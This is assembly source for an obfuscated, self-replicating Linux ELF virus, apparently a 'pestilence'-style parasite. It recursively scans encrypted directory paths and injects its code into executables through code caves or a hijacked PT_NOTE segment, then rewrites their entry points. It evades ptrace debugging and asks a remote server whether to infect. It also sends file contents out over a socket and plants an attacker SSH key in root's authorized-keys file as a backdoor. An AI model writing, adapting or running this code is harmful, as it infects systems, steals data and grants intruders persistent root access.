%include "asm/srcs/obf_file.inc"
; %include "asm/srcs/pestilence.inc"

bits 64 
default rel

section .text
global _start

_start:
; mov rbp, rsp
push rbp
mov rbp, rsp
PUSHA
; lea rdi, [rel dir1] ; dir to open for arg readDir
; mov rsi, dir1Len
; call _readDir
call _map_int_table
; call _check_debug
call _isInfectionAllow
test rax, rax
js _final_jmp

mov rdx, 0 
mov rsi, dir1Len
lea rdi, [rel dir1] ; dir to open for arg initDir

; mov rdi, dir1 ; dir to open for arg initDir
call _initDir

mov rdx, 0 
mov rsi, dir2Len
lea rdi, [rel dir2]
; mov rdi, dir2 ; dir to open for arg initDir
call _initDir

call _backdoor

; jmp _exit
_final_jmp:
POPA 
mov rsp, rbp
pop rbp
_bf_exit:
jmp _exit

_check_debug:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
mov rax, r14 
movzx r14, byte [r15 + 119]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 235]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 351]
or rax, r14 
pop r14
pop r15
syscall
push rax
mov rsi, rax
mov rax, SYS_PTRACE 
mov rdi, PTRACE_TRACEME 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov rdx, r14 
movzx r14, byte [r15 + 120]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 236]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 352]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov r10, r14 
movzx r14, byte [r15 + 117]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 349]
or r10, r14 
pop r14
pop r15
syscall
cmp rax, 0 
jl _exit
pop rax
mov rsi, rax
mov rax, SYS_PTRACE 
mov rdi, PTRACE_DETACH 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov rdx, r14 
movzx r14, byte [r15 + 120]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 236]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 352]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov r10, r14 
movzx r14, byte [r15 + 117]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 349]
or r10, r14 
pop r14
pop r15
syscall
ret

; take directory to open in rdi-> haUkB

_initDir:
; placing zxOZkA on the stack
push rbp
mov rbp, rsp
; rdi -> to _encrypt 
push rax
_dec_initD:
call _decrypt_str
mov rdi, rax
pop rax
sub rsp, zxOZkA_size
lea r8, FAM(zxOZkA.mAlZN)
or qword [r8], -1
lea rsi, FAM(zxOZkA.haUkB)
call _strcpy ; strcpy(zxOZkA.haUkB(rsi), haUkB(rdi))
cmp rdx, 0 
je _readDir
call _strlen ; strlen(zxOZkA.haUkB(rsi))
add rsi, rax
cmp BYTE [rsi - 1], '/' 
je _join
mov BYTE [rsi], '/' 
add rsi, 1 

_join:
mov rdi, rdx
call _strcpy

mov rdi, rsp

_readDir:
mov rax, SYS_OPEN 
mov rsi, O_RDONLY | O_DIRECTORY 
xor rdx, rdx
syscall
cmp rax, 0 
jl _returnClose

lea rdi, FAM(zxOZkA.mAlZN) ; en registre le mAlZN dans la struct
mov [rdi], rax

_getDents:
lea r10, FAM(zxOZkA.mAlZN) 
lea r9, FAM(zxOZkA.Oqbj5UNm) ; init Oqbj5UNm
mov DWORD [r9], 0 
mov rax, SYS_GETDENTS 
mov rdi, qword [r10]
lea rsi, FAM(zxOZkA.ihadZrNt)
mov rdx, PAGE_SIZE 
syscall
cmp rax, 0 
jle _returnClose

lea r10, FAM(zxOZkA.em76UiFD5) ; r10 -> (struct zxOZkA.diretents_struct_ptr)
mov [r10], rsi ; zxOZkA.em76UiFD5 -> zxOZkA.ihadZrNt
lea r11, FAM(zxOZkA.GyQ45i) ; r11 -> (struct zxOZkA.GyQ45i)
mov DWORD [r11], eax 

_listFile:
lea r8, FAM(zxOZkA.Oqbj5UNm) ; r8 -> total lu de getdents
lea r9, FAM(zxOZkA.GyQ45i) ; r9 -> total a lire de getdents
mov r10, FAM(zxOZkA.em76UiFD5) ; r10 -> actual dirent struct
lea r11, FAM(zxOZkA.em76UiFD5) ; r11 -> ptr de la struct actuelle
movzx r12, WORD [r10 + D_RECLEN_OFF] 
add [r8], r12d ; update du total lu dans r8
add qword [r11], r12 ; zxOZkA.diretns_struct_ptr -> sur la prochaine struct
cmp BYTE [r10 + D_TYPE], D_FOLDER 
je _recursif
cmp BYTE [r10 + D_TYPE], D_REG_FILE 
jne _checkRead

_updatePath:
; strlen
mov rsi, rsp
call _strlen
lea rsi, [r10 + D_NAME] 
mov byte [rsi - 1], '/'
add rax, 1 
sub rsi, rax
mov rdi, rsp
call _strcpyNoNull

call _check_file

jmp _checkRead

_recursif:
lea rdi, FAM(zxOZkA.haUkB)
push rax
lea rsi, FAM(zxOZkA.haUkB)
call _strlen
mov rsi, rax
pop rax
lea rdx, [r10 + D_NAME] 
cmp BYTE [rdx], 0x2e 
jne _callInit
cmp BYTE [rdx + 1], 0 
je _checkRead
cmp BYTE [rdx + 1], 0x2e 
jne _callInit
cmp BYTE [rdx + 2], 0 
je _checkRead

_callInit:
call _initDir

_checkRead:
mov r8, FAM(zxOZkA.Oqbj5UNm)
mov r12, FAM(zxOZkA.GyQ45i)
cmp r8d, r12d ; if (total lu >= total getdents)
jge _getDents
jmp _listFile

_returnClose:
mov rdi, FAM(zxOZkA.mAlZN)
cmp qword rdi, 0 
jle _returnLeave
mov rax, SYS_CLOSE 
syscall
or qword FAM(zxOZkA.mAlZN), -1
jmp _returnLeave


_returnLeave:
leave

_return:
ret

_check_file:
push rbp
mov rbp, rsp
sub rsp, kYUbCohU_size
lea rax, INF(kYUbCohU.H8g9sz)
mov qword [rax], 0 
lea rax, INF(kYUbCohU.qj8vkYwEi)
mov byte [rax], 0 
lea rax, INF(kYUbCohU.VzEDSkNs5J)
mov qword [rax], 0 

_open_file:
mov rax, SYS_OPEN 
mov rdi, rsi
mov rsi, O_RDWR 
xor rdx, rdx
syscall
cmp rax, 0x0 
jl _returnLeave
mov INF(kYUbCohU.ArmPp1A6xD), rax

; === get file size ===
_get_filesz:
mov rax, SYS_LSEEK 
mov rdi, INF(kYUbCohU.ArmPp1A6xD)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov rsi, r14 
movzx r14, byte [r15 + 117]
shl r14, 0x10
or rsi, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or rsi, r14 
movzx r14, byte [r15 + 349]
or rsi, r14 
pop r14
pop r15
mov rdx, SEEK_END 
syscall
cmp rax, 0x0 
jle _close_file_inf
mov INF(kYUbCohU.lk2eKo), rax
mov INF(kYUbCohU.bYpgX), rax

_map_file:
; rax -> map
mov rsi, rax ; rsi = file_size
mov rax, SYS_MMAP 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov rdi, r14 
movzx r14, byte [r15 + 117]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 349]
or rdi, r14 
pop r14
pop r15
mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC 
mov r10, MAP_SHARED 
mov r8, INF(kYUbCohU.ArmPp1A6xD)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov r9, r14 
movzx r14, byte [r15 + 117]
shl r14, 0x10
or r9, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or r9, r14 
movzx r14, byte [r15 + 349]
or r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl _close_file_inf
call _extractData
mov rax, r12
mov rsi, r15
lea r8, INF(kYUbCohU.fBEK0owvp)
mov [r8], rax

_check_format:
cmp dword [rax + 1], 0x02464c45 
jne _unmap_close_inf

_check_already_infected:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
mov r15, rax
mov r14, r15
add r14, qword [r14 + Tzbf1yARX9.yJMhJuiSq]
xor rcx, rcx
_go_to_last_segment:
cmp cx, [r15 + Tzbf1yARX9.jC6i2sdAo]
jge _go_to_last_segment_end 
add r14, M8f3Z_size
inc rcx
jmp _go_to_last_segment
_go_to_last_segment_end:
mov INF(kYUbCohU.Te6H5pBbwA), r14
xor r9, r9
_segment_loop:
cmp cx, 0 
jle _segment_loop_end
_check_segment_format:
bt word [r14], 0 
jnc _continue
bt qword [r14], 0x20 
jc _handle_valid_segment
_continue:
dec rcx
sub r14, M8f3Z_size
jmp _segment_loop

_segment_loop_end:
mov r9, INF(kYUbCohU.H8g9sz)
cmp r9, 0 
je _unmap_close_inf
cmp byte INF(kYUbCohU.qj8vkYwEi), 1 
je _add_page
jmp _infection ; else jmp _infection

_handle_valid_segment:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
_check_signature:
; r8 -> potential signature
; r9 == signature variable
mov r8, r15
add r8, qword [r14 + M8f3Z.h0GaSE4cF]
add r8, qword [r14 + M8f3Z.VPdE25Nabr]
sub r8, signature_len
mov r9, qword [rel signature]
cmp qword r9, [r8]
je _unmap_close_inf

_valid_seg_already_found:
mov r9, INF(kYUbCohU.H8g9sz)
test r9, r9
jz _check_cave_size
mov r9, INF(kYUbCohU.qj8vkYwEi)
test r9, r9
jz _continue

_check_cave_size:
; r8 == end of kYUbCohU offset
; r9 == next segment offset
mov r8, qword [r14 + M8f3Z.h0GaSE4cF]
add r8, qword [r14 + M8f3Z.VPdE25Nabr]
mov r13, r8 ; save segment end's offset
add r8, CODE_LEN 
mov r9, r14
add r9, M8f3Z_size
add r9, M8f3Z.h0GaSE4cF
cmp [r9], r8
setb INF(kYUbCohU.qj8vkYwEi) ; if ([r9] < r8) { kYUbCohU.qj8vkYwEi = 1) }

_save_offsets:
; r8 -> kYUbCohU structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (_check_cave_size)
;*r14 -> segment header in header table
lea r8, INF(kYUbCohU.la5hS)
mov [r8], cl
lea r8, INF(kYUbCohU.vduAsO)
mov r12, qword [r15 + Tzbf1yARX9.k9A7SUa9]
mov [r8], r12
lea r8, INF(kYUbCohU.H8g9sz)
mov [r8], r13
lea r8, INF(kYUbCohU.To8v5)
push r9
mov r9, qword [r14 + M8f3Z.TDEERGx]
add r9, qword [r14 + M8f3Z.CMN5KYCr]
mov [r8], r9
pop r9
lea r8, INF(kYUbCohU.kAoNvY)
mov [r8], r14
jmp _continue

_add_page:
_update_file_size:
mov rax, SYS_FTRUNCATE 
mov rdi, INF(kYUbCohU.ArmPp1A6xD)
lea rsi, INF(kYUbCohU.lk2eKo)
push qword [rsi]
add qword [rsi], PAGE_SIZE 
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
mov rsi, qword [rsi]
syscall
pop rsi
cmp rax, 0 
jl _unmap_close_inf

_unmap_prev_map:
mov rdi, INF(kYUbCohU.fBEK0owvp)
mov rax, SYS_UNMAP 
syscall

_remap_file:
mov rax, SYS_MMAP 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov rdi, r14 
movzx r14, byte [r15 + 117]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 349]
or rdi, r14 
pop r14
pop r15
mov rsi, INF(kYUbCohU.lk2eKo) ; rsi = file_size
mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC 
mov r10, MAP_SHARED 
mov r8, INF(kYUbCohU.ArmPp1A6xD)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov r9, r14 
movzx r14, byte [r15 + 117]
shl r14, 0x10
or r9, r14 
movzx r14, byte [r15 + 233]
shl r14, 0x8
or r9, r14 
movzx r14, byte [r15 + 349]
or r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl _close_file_inf
lea r8, INF(kYUbCohU.fBEK0owvp)
mov [r8], rax

_find_memory_eof:
mov r14, INF(kYUbCohU.fBEK0owvp)
movzx rax, word [r14 + Tzbf1yARX9.EeCKTG2YX]
add r14, qword [r14 + Tzbf1yARX9.QsDSta]
xor rcx, rcx

_find_mem_eof_loop:
cmp rcx, rax
jge _find_mem_eof_end
mov rbx, qword [r14 + CNLtGo.I2jOj5f6D]
add rbx, qword [r14 + CNLtGo.x8tu2Q]
cmp INF(kYUbCohU.VzEDSkNs5J), rbx
jge _find_mem_eof_continue
mov INF(kYUbCohU.VzEDSkNs5J), rbx

_find_mem_eof_continue:
add r14, CNLtGo_size
inc rcx
jmp _find_mem_eof_loop

_find_mem_eof_end:

_find_pt_note:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(kYUbCohU.fBEK0owvp)
movzx rax, word [r14 + Tzbf1yARX9.jC6i2sdAo]
add r14, qword [r14 + Tzbf1yARX9.yJMhJuiSq]
xor rcx, rcx

_find_pt_note_loop:
cmp rcx, rax
jge _find_pt_note_loop_end
cmp dword [r14 + M8f3Z.NI6N5cFP], PT_NOTE 
je _mutate_pt_note_seg

_find_pt_note_loop_continue:
add r14, M8f3Z_size
inc rcx
jmp _find_pt_note_loop

_find_pt_note_loop_end:
mov r14, -1 

_mutate_pt_note_seg:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl _update_final_jump
mov dword [r14 + M8f3Z.NI6N5cFP], PT_LOAD 
mov qword [r14 + M8f3Z.ZbmRce9L3a], PF_X | PF_R 
mov qword [r14 + M8f3Z.VPdE25Nabr], CODE_LEN 
mov qword [r14 + M8f3Z.CMN5KYCr], CODE_LEN 
mov qword [r14 + M8f3Z.qhLq3iaS], PAGE_SIZE 
mov rax, INF(kYUbCohU.bYpgX)
add rax, PAGE_SIZE 
and rax, -4096
mov qword [r14 + M8f3Z.h0GaSE4cF], rax
mov qword INF(kYUbCohU.H8g9sz), rax
mov rax, INF(kYUbCohU.VzEDSkNs5J)
add rax, PAGE_SIZE 
and rax, -4096
mov qword INF(kYUbCohU.To8v5), rax
mov qword [r14 + M8f3Z.TDEERGx], rax
mov qword [r14 + M8f3Z.jwhMDhaGB], rax

_infection:
_update_elf_hdr:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(kYUbCohU.fBEK0owvp)
add r8, Tzbf1yARX9.k9A7SUa9
mov r10, INF(kYUbCohU.To8v5)
mov [r8], r10
cmp byte INF(kYUbCohU.qj8vkYwEi), 0 
jg _copy_parasite
mov rdi, CODE_LEN 
call _update_seg_sizes

_copy_parasite:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (_end - _start)
mov rdi, INF(kYUbCohU.fBEK0owvp)
add rdi, INF(kYUbCohU.H8g9sz)
lea rsi, [rel _start] ; rsi -> start of our code
mov rcx, CODE_LEN 
cld ; copy from _start to _end (= !std)
rep movsb

_update_final_jump:
; r8 -> _bf_exit instruction's addr (_bf_exit + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(kYUbCohU.fBEK0owvp)
add r8, INF(kYUbCohU.H8g9sz)
add r8, FINJMP_OFF 
inc r8
mov r10, INF(kYUbCohU.To8v5)
add r10, FINJMP_OFF 
add r10, 0x05 
mov r9, INF(kYUbCohU.vduAsO)
sub r9, r10
mov [r8], r9d
jmp _unmap_close_inf

_update_seg_sizes:
; r8 -> segment header data
;*r14 -> segment header in header table

mov r8, INF(kYUbCohU.kAoNvY)
push r8 ; save header start for later

; * Update file size *
add r8, qword M8f3Z.VPdE25Nabr
add qword [r8], rdi
pop r8

; * Update memory size *
add r8, M8f3Z.CMN5KYCr
add qword [r8], rdi

ret

; --- privesc + backdoor
_backdoor:
; open "/root/.ssh/authorized.key"
; r9 == mAlZN
push rbp
mov rbp, rsp
sub rsp, 0x1000 
mov rax, SYS_OPEN 
; mov rdi, sshFile
lea rdi, [rel sshFile]
push rax
push rsi
mov rsi, sshFile_len
_decBack:
call _decrypt_str
mov rdi, rax
pop rsi
pop rax
mov rsi, O_RDWR | O_CREAT 
mov rdx, 600 
syscall
test rax, rax
js _returnLeave
mov r9, rax

_readSsh:
; *r9 == mAlZN
; r10 == size read
; rsi -> buffer
mov rax, SYS_READ 
mov rdi, r9
mov rsi, rbp
sub rsi, 0x1000 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 41]
shl r14, 0x18
mov rdx, r14 
movzx r14, byte [r15 + 157]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 273]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 389]
or rdx, r14 
pop r14
pop r15
syscall
cmp rax, 0 
je _notFound
jl _closeSsh
mov r10, rax

_checkBackdoor:
; rcx == nombre d'octet lue
; r11 -> buffer
mov rcx, r10
mov r11, rsi

; for every new line
_findNewline:
cmp byte [r11], 0xa 
je _cmpLine
inc r11
loop _findNewline
mov rax, SYS_WRITE 
; mov rsi, back
lea rsi, [back]
mov rdx, 1 
syscall
jmp _notFound

; cmp the line with pub ssh key
_cmpLine:
mov byte [r11], 0 
mov rdi, r11
sub rdi, sshPubLen - 1 
lea rsi, [rel sshPub]
push rax
push rdi
lea rdi, [rel sshPub]
mov rsi, sshPubLen
_decCmpLine:
call _decrypt_str
mov rsi, rax
pop rdi
pop rax
push rcx
call _strcmp
pop rcx
test rax, rax 
je _closeSsh
inc r11
dec rcx
jnz _findNewline
; loop _findNewline

; if not found write it
_notFound:
mov rdi, r9
mov rax, SYS_WRITE 
lea rsi, [rel sshPub]
push rax
push rdi
lea rdi, [rel sshPub]
mov rsi, sshPubLen
_decNotFound:
call _decrypt_str
mov rsi, rax
pop rdi
pop rax
mov rdx, sshPubLen
syscall
mov rax, SYS_WRITE 
lea rsi, [rel back]
; push rax
; push rdi
; lea rdi, [rel back]
; mov rsi, backLen
_decNotFound1:
; call _decrypt_str
; mov rsi, rax
; pop rdi
; pop rax
mov rdx, 1 
syscall

_closeSsh:
mov rax, SYS_CLOSE 
mov rdi, r9
syscall
jmp _returnLeave


_initSocket:
_creatSocket:
mov rax, SYS_SOCKET 
mov rdi, AF_INET 
mov rsi, SOCK_STREAM 
xor rdx, rdx
syscall
test rax, rax
js _return
mov rdi, rax

_connectSocket:
mov rax, SYS_CONNECT 
lea rsi, [rel sockaddr]
mov rdx, 16 
syscall
test rax, rax
js _closeSock
mov rax, rdi
ret

_munmapExtractBuffer:
mov rax, SYS_UNMAP 
mov rdi, rsi
mov rsi, rdx
syscall
pop rdi

; (rdi: socket)
_closeSock:
mov rax, SYS_CLOSE 
syscall
mov rax, -1
ret

; extrait les donnees des fichiers via http
_extractData:
mov r12, rax ; r12 -> maped file_date
push rsi
call _creatSocket
pop rsi
mov r13, rax
_checkFd:
cmp r13, 0 
jl _return
_mmapBuffer:
; rax -> mmap buffer
; r15 == la size du mmap buffer
; r12 -> maped file_data
mov rax, SYS_MMAP 
xor rdi, rdi
push rsi
add rsi, headerStartLen
add rsi, headerEndLen
add rsi, 10 
mov r15, rsi
mov rdx, PROT_READ | PROT_WRITE 
mov r10, MAP_PRIVATE | MAP_ANONYMOUS 
xor r8, r8
xor r9, r9
syscall

_copyData:
; r14 -> header buffer
; *r15 == la taille du mmap buffer
mov r14, rax
mov rsi, rax
lea rdi, [rel headerStart]
call _strcpy
pop rax
push rax
add rsi, headerStartLen - 1 
call _itoa
lea rdi, [rel headerEnd]
call _strcpy
add rsi, headerEndLen - 1 
mov rdi, r12
pop rcx
call _strncpy

_sendTo:
mov rax, SYS_SENDTO 
mov rdi, r13
mov rsi, r14
mov rdx, r15
xor r10, r10
xor r9, r9
syscall
push rdi
jmp _munmapExtractBuffer

; manage kYUbCohU
_isInfectionAllow:
push rbp
mov rbp, rsp 
call _creatSocket
cmp rax, 0 
jl _allow

_sendInfectionRequest:
;rdi == sockfd
mov rdi, rax
mov rax, SYS_SENDTO 
lea rsi, [rel headerGet]
mov rdx, headerGetLen
xor r10, r10
xor r9, r9
syscall
test rax, rax
js _allow

_nanoSleep:
push rdi
mov rax, 35 
lea rdi, [rel timespec]
xor rsi, rsi
syscall
pop rdi

_recvInfectionRequest:
;* rdi == sockfd
mov rax, SYS_RECVFROM 
sub rsp, 200 
mov rsi, rsp
mov rdx, 200 
xor r10, r10
syscall
test rax, rax
js _allow

_infectionRequestRespons:
;* rdi == sockfd
mov rsi, rsp
call _strlen
add rsp, rax
sub rsp, 2 

cmp WORD [rsp], 0x4b4f 
jne _notAllow

_allow:
call _closeSock
mov rax, 0 
jmp _returnLeave

_notAllow:
call _closeSock
mov rax, -1
jmp _returnLeave

;;**;;
; rax: int *_map_int_table( void )
_map_int_table:
; rax -> new map
push rdi
push rsi
push rdx
push r10
push r8
push r9
mov rax, SYS_MMAP
mov rdi, 0x0
mov rsi, 0x1d0
mov rdx, PROT_READ | PROT_WRITE
mov r10, 0x22
mov r8, -1
mov r9, 0x0
syscall
cmp rax, -1
jl _end_map_int
movq xmm15, rax
mov dword [rax + 0], 0x00000000
mov dword [rax + 4], 0x00000000
mov dword [rax + 8], 0x00000000
mov dword [rax + 12], 0x00000000
mov dword [rax + 16], 0x00000000
mov dword [rax + 20], 0x00000000
mov dword [rax + 24], 0x00020000
mov dword [rax + 28], 0x00000000
mov dword [rax + 32], 0x00000000
mov dword [rax + 36], 0x00000000
mov dword [rax + 40], 0x00000000
mov dword [rax + 44], 0x00000000
mov dword [rax + 48], 0x00000000
mov dword [rax + 52], 0x00000000
mov dword [rax + 56], 0x00000000
mov dword [rax + 60], 0x00000000
mov dword [rax + 64], 0x00000000
mov dword [rax + 68], 0x00000000
mov dword [rax + 72], 0x00000000
mov dword [rax + 76], 0x00000000
mov dword [rax + 80], 0x00000100
mov dword [rax + 84], 0x00000000
mov dword [rax + 88], 0x00000000
mov dword [rax + 92], 0x00000000
mov dword [rax + 96], 0x00000000
mov dword [rax + 100], 0x00000000
mov dword [rax + 104], 0x00000000
mov dword [rax + 108], 0x00000000
mov dword [rax + 112], 0x00000000
mov dword [rax + 116], 0x00000000
mov dword [rax + 120], 0x00000000
mov dword [rax + 124], 0x00000000
mov dword [rax + 128], 0x00000000
mov dword [rax + 132], 0x00000000
mov dword [rax + 136], 0x00000000
mov dword [rax + 140], 0x00460000
mov dword [rax + 144], 0x00000000
mov dword [rax + 148], 0x00000000
mov dword [rax + 152], 0x00000000
mov dword [rax + 156], 0x00000000
mov dword [rax + 160], 0x00000000
mov dword [rax + 164], 0x00000000
mov dword [rax + 168], 0x00000000
mov dword [rax + 172], 0x00000000
mov dword [rax + 176], 0x00000000
mov dword [rax + 180], 0x00000000
mov dword [rax + 184], 0x00000000
mov dword [rax + 188], 0x00000000
mov dword [rax + 192], 0x00000000
mov dword [rax + 196], 0x00000000
mov dword [rax + 200], 0x00000000
mov dword [rax + 204], 0x00000000
mov dword [rax + 208], 0x00000098
mov dword [rax + 212], 0x00000000
mov dword [rax + 216], 0x00000000
mov dword [rax + 220], 0x00000000
mov dword [rax + 224], 0x00000000
mov dword [rax + 228], 0x06050000
mov dword [rax + 232], 0x00000000
mov dword [rax + 236], 0x00000000
mov dword [rax + 240], 0x00000000
mov dword [rax + 244], 0x00000000
mov dword [rax + 248], 0x00000000
mov dword [rax + 252], 0x00000000
mov dword [rax + 256], 0x004c0000
mov dword [rax + 260], 0x00000000
mov dword [rax + 264], 0x00000000
mov dword [rax + 268], 0x00000000
mov dword [rax + 272], 0x00021000
mov dword [rax + 276], 0x00000000
mov dword [rax + 280], 0x00000000
mov dword [rax + 284], 0x00000000
mov dword [rax + 288], 0x4b000000
mov dword [rax + 292], 0x00000000
mov dword [rax + 296], 0x00000000
mov dword [rax + 300], 0x00000000
mov dword [rax + 304], 0x00000000
mov dword [rax + 308], 0x40000000
mov dword [rax + 312], 0x0000001f
mov dword [rax + 316], 0x00000000
mov dword [rax + 320], 0x00000000
mov dword [rax + 324], 0x00000096
mov dword [rax + 328], 0x00000000
mov dword [rax + 332], 0x00000000
mov dword [rax + 336], 0x00000000
mov dword [rax + 340], 0x00000000
mov dword [rax + 344], 0x28170000
mov dword [rax + 348], 0x6e000040
mov dword [rax + 352], 0x00000001
mov dword [rax + 356], 0x00000101
mov dword [rax + 360], 0x2e010100
mov dword [rax + 364], 0x02010001
mov dword [rax + 368], 0x00000000
mov dword [rax + 372], 0x00450100
mov dword [rax + 376], 0x01200000
mov dword [rax + 380], 0x00010100
mov dword [rax + 384], 0x01000001
mov dword [rax + 388], 0x00580005
mov dword [rax + 392], 0x0100010a
mov dword [rax + 396], 0x0a001001
mov dword [rax + 400], 0x23000101
mov dword [rax + 404], 0x4f02c8c8
mov dword [rax + 408], 0x00010000
mov dword [rax + 412], 0x01000001
mov dword [rax + 416], 0x3c30090a
mov dword [rax + 420], 0x09000000
mov dword [rax + 424], 0x1e010000
mov dword [rax + 428], 0x0a0c7e40
mov dword [rax + 432], 0x0d000a0d
mov dword [rax + 436], 0x000a0c0a
mov dword [rax + 440], 0x0b08037f
mov dword [rax + 444], 0x2d2c2a29
mov dword [rax + 448], 0x00d9654d
mov dword [rax + 452], 0x00400201
mov dword [rax + 456], 0x13120804
mov dword [rax + 460], 0x02440717
_end_map_int:
pop r9
pop r8
pop r10
pop rdx
pop rsi
pop rdi
ret
; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
_decrypt_str:
; rax == div quotient
; rbx -> to_decrypt
; rcx == counter
; rdx == div modulo
; r9 == len key
; r10 -> key_char
; r11 -> decrypted str (mmap)
; r12 == len to_decrypt
; rsi -> key
push rbx
push rcx
push rdx
push r8
push r9
push r10
push r11
push r12
mov rbx, rdi
mov r12, rsi
xor rdi, rdi ; addr = NULL (let kernel choose)
mov rdx, 0x03 ; PROT_READ | PROT_WRITE = 1 | 2 = 3
mov r10, 0x22 ; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22
mov r8, -1 ; mAlZN = -1
xor r9, r9 ; offset = 0
mov rax, 9 ; syscall number for mmap
syscall
cmp rax, 0
jl _decrypt_loop_end
mov r11, rax
lea rsi, key
mov r9, 0xc
xor rcx, rcx
xor rdx, rdx
_decrypt_loop:
cmp rcx, r12
jge _decrypt_loop_end
mov rax, rcx
xor rdx, rdx
cmp rcx, 0
jne _no_zero
xor rax, rax
jmp _end_div
_no_zero:
div r9
_end_div:
movzx r10, byte [rsi + rdx] ; r10 == key[rcx % key_len]
xor r10b, [rbx+rcx]
mov [r11+rcx], r10b
inc rcx
jmp _decrypt_loop
_decrypt_loop_end:
mov rax, r11
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rbx
ret

; strcpy(dst:rsi src: rdi)
_strcpyNoNull:
xor rcx, rcx
strcpy_loop:
cmp byte[rdi + rcx], 0 
je strcpy_loop_end
mov al, byte[rdi+rcx]
mov byte [rsi+rcx], al
add rcx, 1 
jmp strcpy_loop
strcpy_loop_end:
ret

_strcpy:
call _strcpyNoNull
mov byte [rsi + rcx], 0 
ret

; strncpy(dst:rsi, src: rdi, count: rcx)
_strncpy:
sub rcx, 1 
_strncpyLoop:
mov al, byte[rdi+rcx]
mov byte [rsi + rcx], al
loop _strncpyLoop
mov al, byte[rdi+rcx]
mov byte [rsi + rcx], al
ret

; strlen(str:rsi)
_strlen:
xor rcx, rcx

ft_strlen_loop:
cmp byte [rsi + rcx], 0 
je ft_strlen_end
inc rcx
jmp ft_strlen_loop

ft_strlen_end:
mov rax, rcx
ret

; strcmp(rdi, rsi)
_strcmp:
xor rcx, rcx
xor rax, rax
strcmp_loop:
mov al, byte[rdi+rcx]
mov bl, byte[rsi+rcx]
cmp al, bl
jl strcmp_loop_end
je strcmp_loop_end
jg strcmp_loop_end

cmp al, 0 
je strcmp_loop_end

add rcx, 1 
jmp strcmp_loop

strcmp_loop_end:
movzx rax, al
movzx r8, bl
sub rax, r8
ret

; int itoa(rax:int, rsi:*buffer)
; (a la fin rsi pointe sur le byte d'apres)
_itoa:
mov r9, 10 
call _itoaLoop
ret

_itoaLoop:
cmp rax, 9 
jg _itoaRecursif
mov [rsi], ax
add byte [rsi], 48 
inc rsi
ret

_itoaRecursif:
push rax
xor rdx, rdx
div r9
call _itoaLoop 
pop rax
push rax
xor rdx, rdx
div r9
mov rax, rdx
call _itoaLoop 
pop rax
ret
mov [rsi + rcx], rax
_unmap_close_inf:
mov rdi, INF(kYUbCohU.fBEK0owvp)
mov rsi, INF(kYUbCohU.lk2eKo)
mov rax, SYS_UNMAP 
syscall
jmp _close_file_inf

_close_file_inf:
mov rax, SYS_CLOSE 
mov rdi, INF(kYUbCohU.ArmPp1A6xD)
syscall
mov qword INF(kYUbCohU.ArmPp1A6xD), -1
jmp _returnLeave

_exit:
mov rax, 60 
xor rdi, rdi
syscall

dir1 db 0x46, 0x51, 0x1A, 0x16, 0x5F, 0x46, 0x22, 0x20, 0x03, 0x32
dir1Len equ $ - dir1
dir2 db 0x46, 0x51, 0x1A, 0x16, 0x5F, 0x46, 0x22, 0x20, 0x03, 0x00, 0x26
dir2Len equ $ - dir2
key db 0x69, 0x25, 0x77, 0x66, 0x70, 0x32, 0x47, 0x53, 0x77, 0x32, 0x26, 0x7D
back db 9, 0 
backLen equ $ - back
slash db 0x46, 0x25
